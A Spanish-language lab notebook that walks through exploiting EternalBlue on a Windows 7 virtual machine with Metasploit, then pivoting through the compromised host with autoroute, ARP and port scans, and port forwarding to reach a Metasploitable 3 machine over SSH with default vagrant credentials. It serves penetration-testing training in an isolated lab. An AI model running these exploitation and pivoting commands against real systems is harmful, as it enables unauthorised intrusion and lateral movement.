Laboratorio:
Máquina Atacante (192.168.56.10)
Máquina Windows 7 64bits (192.168.56.3 / 10.10.10.4)-> explotación Ethernalblue 
Máquina Metasploitable 3 (10.10.10.5)

![[Pasted image 20250702103208.png]]

## 1) ATAQUE ETHERNAL BLUE (Máquina Windows 7)

**Reconocimiento con Nmap:**

```
nmap -p445 -sCV <ip_victima>
```

![[Pasted image 20250702103530.png]]

**Análisis de la vulnerabilidad Ethernalblue con nmap:**

```
nmap -p445 --script smb-vuln-ms17-010 <ip_victima>
```

![[Pasted image 20250702104015.png]]

**Explotación de la vulnerabilidad**

```
msfconole
```

![[Pasted image 20250702104256.png]]

Buscamos el exploit asociado con la vulnerabilidad:
```
search exploit eternalblue
```
![[Pasted image 20250702104612.png]]

```
use exploit/windows/smb/ms17_010_eternalblue
show options
```

![[Pasted image 20250702105547.png]]
Debemos rellenar el campo RHOSTS con el ip de la maquina victima
```
set RHOSTS <ip_victima>
```
DEBEMOS TENER EN CUENTA EL PAYLOAD. En este caso, utiilizaremos el default `windows/x64/meterpreter/reverse_tcp`, en caso de querer utilizar otro payload:

```
set payload <payload>
```
Ahora ejecutamos el exploit:
```
run
```
![[Pasted image 20250702110949.png]]

## 2) COMENZAMOS CON EL PIVOTING (Ataque a la máquina Metasploitable 3)

Ejecutamos el comando **ipconfig** para listar las interfaces de red que tiene activa la máquina Windows 7.

![[Pasted image 20250702111655.png]]
**Interface 11** ---> IP: 192.168.56.3
**Interface 12** ---> IP: 10.10.10.4 (En esta interfaz haremos el escaneo)

**Enrutamiento del tráfico a través de la sesión comprometida:** 
Con el fin de encontrar el ip de la máquina Metasploitable 3.

Enviamos la sesión de meterpreter a segundo plano y listamos las sesiones que tenemos:
```
background
sessions -i
```
![[Pasted image 20250702113425.png]]

Usaremos el modulo **autoroute** para **configurar el enrutamiento automático** a través de una sesión comprometida (por ejemplo, una sesión de Meterpreter). Este módulo permite que Metasploit enrute tráfico a través del sistema comprometido para llegar a otras redes internas que no son accesibles directamente desde tu máquina atacante:
```
use post/multi/manage/autoroute
show options
```
![[Pasted image 20250702113829.png]]

Este módulo necesita que le especifiquemos la **SESSION**, en este caso seria la sesión de meterpreter que tenemos en la máquina windows 7:
```
set SESSION <session>
run
```
![[Pasted image 20250702114242.png]]

```
route print
```
![[Pasted image 20250702114359.png]]

**Escaneo de la red interna de la máquina:**
Haremos uso del módulo `post/windows/gather/arp_scanner` para **descubrir dispositivos activos en una red local** usando el protocolo **ARP (Address Resolution Protocol)**.

```
use post/windows/gather/arp_scanner
show options
```
![[Pasted image 20250702115445.png]]

Este módulo necesita que le especifiquemos: **RHOSTS** (Segmento de red de la interfaz que queremos escanear), **SESSION** (sesión de la máquina Windows 7).
```
set RHOSTS 10.10.10.0/24 (en este caso)
set SESSION <session>
run
```
![[Pasted image 20250702120402.png]]
**Windows 7** --> 10.10.10.4
**Serv. DHCP vbx** --> 10.10.10.3
**Metasploitable 3** --> 10.10.10.5
**Dirección de Broadcast** --> 10.10.10.255

**Escaneo de puertos a la máquina Metasploitable 3 (Remote Port Forwarding):**
Usaremos el módulo `scanner/portscan/tcp` es un escáner de puertos **TCP** que se utiliza para identificar **puertos abiertos** en uno o varios hosts.

```
use scanner/portscan/tcp
show options
```
![[Pasted image 20250702130606.png]]

Este módulo nos pide especificar: **RHOSTS** (IP de la máquina Metasploitable 3)

```
set RHOSTS 10.10.10.5 (en este caso)
run
```
![[Pasted image 20250702134913.png]]

**Remote Port Forwarding:**
### Alternativa 1
```
sessions -i 1
```

Ahora asignaremos un puerto de la máquina local atacante para un puerto de la máquina Metasploitable.
```
portfwd add -l 8080 -p 80 -r 10.10.10.5 (IP Metasploitable 3)
```
![[Pasted image 20250702150535.png]]

Accederemos a http://127.0.0.1:8080 para ver si se nos ha transferido el puerto 80 de la máquina Metasploitable 3.
![[Pasted image 20250702150741.png]]

### Alternativa 2 (Mejor)

Usaremos el módulo `post/windows/manage/portproxy` para **configurar reglas de redireccionamiento de puertos (port forwarding)** en sistemas Windows comprometidos, **usando el comando** `netsh interface portproxy`.

```
use post/windows/manage/portproxy
show options
```
![[Pasted image 20250702145903.png]]

Este módulo nos pide especificar: **CONNECT_ADDRESS** (IP de Metasploitable 3), **CONNECT_PORT** (puertos que atacaremos), **LOCAL_ADDRESS** (0.0.0.0), **LOCAL_PORT** (puerto de la maquina intermediaria donde se alojarán los puertos de la máquina Metasploitable 3), **SESSION**.

```
set CONNECT_ADDRESS 10.10.10.5 (Metasploitable 3)
set CONNECT_PORT 22 
set LOCAL_ADDRESS 0.0.0.0
set LOCAL_PORT 5000 (Puerto de la maquina intermedia)
set SESSION <session>
run
```
![[Pasted image 20250702152217.png]]
Una vez que nos hemos traído el puerto **22** de la maquina **Metasploitable 3** al puerto **5000** de la maquina **Windows 7**. Intentaremos conectarnos remotamente por **SSH** con las credenciales **vagrant:vagrant**. 

```
ssh vagrant@192.168.56.3 -p 5000
```
![[Pasted image 20250702152556.png]]